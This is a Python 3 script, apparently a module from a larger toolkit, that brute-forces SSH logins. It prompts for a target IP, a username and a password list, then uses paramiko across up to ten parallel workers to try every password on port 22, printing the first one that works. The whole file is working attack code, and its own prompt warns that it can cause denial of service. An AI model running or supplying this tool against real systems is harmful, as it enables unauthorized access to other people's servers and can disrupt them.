#!/usr/bin/python3

import paramiko, sys, os, socket
import time
import re

from multiprocessing import Pool as ThreadPool
import itertools


validIP = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
ts = time.time()
i = 0

def Start0():
	print("Welcome to the SSH Brute Force Module")
	print("Target Host IP, Username, and Password File are required")
	print("--------------------------------------------------------")
	Start1()

def Start1():
	sshbfTarget = input("Target Host: ")
	if validIP.match(sshbfTarget):
		Start2(sshbfTarget)
	else:
		print('Please enter a valid IP')
		Start1()

def Start2(sshbfTarget):
	sshbfUname = input("Username: ")
	Start3(sshbfTarget, sshbfUname)

def Start3(sshbfTarget, sshbfUname):
	sshpwFile = input("Password File: ")
	if os.path.isfile (sshpwFile):
		Confirm(sshbfTarget, sshbfUname, sshpwFile)
	else:
		print("Please enter valid password file.")
		Start3(sshbfTarget, sshbfUname)

def Confirm(sshbfTarget, sshbfUname, sshpwFile):
	sshbfanswer = input("Information Loaded. Continue: [y]: ")
	if (sshbfanswer == 'n'):
			SSHbf1()
	elif (sshbfanswer == '' or 'y'):
			tPools(sshbfTarget, sshbfUname, sshpwFile)
	else:
			print("please pick y or n.")
			Confirm(sshbfTarget, sshbfUname, sshpwFile)


def multiProc(sshbfTarget, sshbfUname, sshpwFile, threadCount):
	pooL = ThreadPool(threadCount)
	total = sum(1 for line in open(sshpwFile))
	passworD = []
	awshet = [sshbfTarget, sshbfUname, total, threadCount]
	with open(sshpwFile) as BANG:		
		for line in BANG:
			passworD.append(line)
			pass
	sshbfResponse = pooL.map( SSHbf4, zip(passworD, itertools.repeat(awshet)))
#	print(sshbfResponse)
#	for responsE, sshbfpD in sshbfResponse:
#		if responsE is None:
#			print(("\nTarget: %s User: %s Password: %s SUCCESSFUL!!" % (sshbfTarget, sshbfUname, sshbfpD)))
#			sys.exit(0)
#		else:
#			pass		   
	pooL.close()
	pooL.join()

def SSHbf4(cB):
	global i
	pD = cB[0].strip()
	cheA = cB[1]
	tG, uNa, tT, tC= cheA
	uN = uNa.strip()
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		resultS = ssh.connect(tG, port=22, username=uN, password=pD)
		ssh.close()
		i = i + 1
		progress(i, tT)
		print(("\nTarget: %s User: %s Password: %s SUCCESSFUL!!" % (tG, uN, pD)))
		os._exit(1)
	except Exception as E:
		ssh.close()
		i = i + 1
		progress(i, tT)
		pass

##----------------------------
## Multi Processing
##----------------------------
def tPools(sshbfTarget, sshbfUname, sshpwFile):
	open(sshpwFile).close()
	tCount = input("How many Threads? Limit 10 - Start Small - Can cause DOS: ")	
	tCount = int(tCount)
	try:    
		if tCount in range(0,11):
			threadCount = tCount
	except:
		tPools(sshbfTarget, sshbfUname, sshpwFile)	    
	multiProc(sshbfTarget, sshbfUname, sshpwFile, threadCount)
##---------------------------------------------------------------------------------##
##Section 4: Progress BAR MAIN                                                     ##
##---------------------------------------------------------------------------------##
def progress(count, total):
	bar_len = 38
	filled_len = int(round(bar_len * count / float(total)))
	percents = round(100.0 * count / float(total), 1)
	bar = '#' * filled_len + '=' * (bar_len - filled_len)
	space = '{message: <0}'.format(message='')
	time2 = time.ctime()
	sys.stdout.write('%s/%s || %s [%s] %s%s Exhausted\r' % (i, total, space, bar, percents, '%'))
	sys.stdout.flush()

##--------------------------
## INIT
##--------------------------	

if __name__ == '__main__':
	try:
		Start0()
	except Exception as E:
		print(E)
	except KeyboardInterrupt:
		print('-----------------------------------------------------')
		print("\nUser Interrupt. Exiting SSH Brute Force Attack Module")
		print('-----------------------------------------------------')

